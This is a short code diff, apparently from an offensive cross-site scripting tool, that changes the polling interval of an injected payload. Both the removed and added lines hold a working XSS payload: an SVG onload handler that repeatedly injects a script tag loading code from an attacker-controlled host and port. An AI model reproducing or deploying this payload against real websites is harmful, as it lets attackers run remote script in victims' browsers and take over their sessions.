@@ -43,7 +43,7 @@ except:
 gene = args.gene
 cmd = format(args.command)
 secs = int(format(args.secs))
-payload = '<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},1212)>\n' % (host, port)
+payload = '<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},1111)>\n' % (host, port)
 
 
 print(banner)
